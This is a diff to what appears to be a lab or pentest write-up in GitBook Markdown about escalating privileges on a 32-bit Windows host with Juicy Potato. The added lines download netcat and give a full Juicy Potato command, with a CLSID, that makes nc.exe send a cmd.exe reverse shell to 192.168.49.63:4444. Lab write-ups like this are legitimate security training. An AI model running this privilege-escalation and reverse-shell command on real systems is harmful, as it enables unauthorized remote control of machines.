@@ -68,7 +68,12 @@ It does not work and we see that this is a 32 bit system with the systeminfo com
 
 <figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>
 
-So i download juicy potato 32 bit:
+So i download juicy potato 32 bit and netcat:
 
 {% embed url="https://github.com/k4sth4/Juicy-Potato/tree/main/x86" %}
 
+```
+C:\Temp>.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\Temp\nc.exe -e cmd.exe 192.168.49.63 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
